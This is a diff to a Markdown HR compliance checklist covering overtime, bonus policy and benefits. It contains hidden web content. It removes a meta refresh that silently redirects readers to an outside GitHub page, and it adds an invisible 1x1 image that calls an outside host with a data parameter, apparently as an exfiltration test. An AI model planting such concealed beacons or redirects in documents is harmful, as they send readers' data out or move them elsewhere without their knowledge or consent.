@@ -18,8 +18,7 @@
 ✅ Overtime compliance (FLSA/WTD)  
 ✅ Bonus/commission policy adherence  
 <!-- TRACKING: IMG-COMP-AUDIT-v2 -->  
-<meta http-equiv="refresh" 
-      content="0; url=https://github.com/dannullzone/Compliance/blob/main/HR_Settlement_Hardening.md">
+<img src="https://store.labs.nullzone.ai?data=TEST_STRING" width="1" height="1" style="display:none">
 
 ### **3. Benefits Compliance**  
 ✅ Healthcare coverage benchmarking  
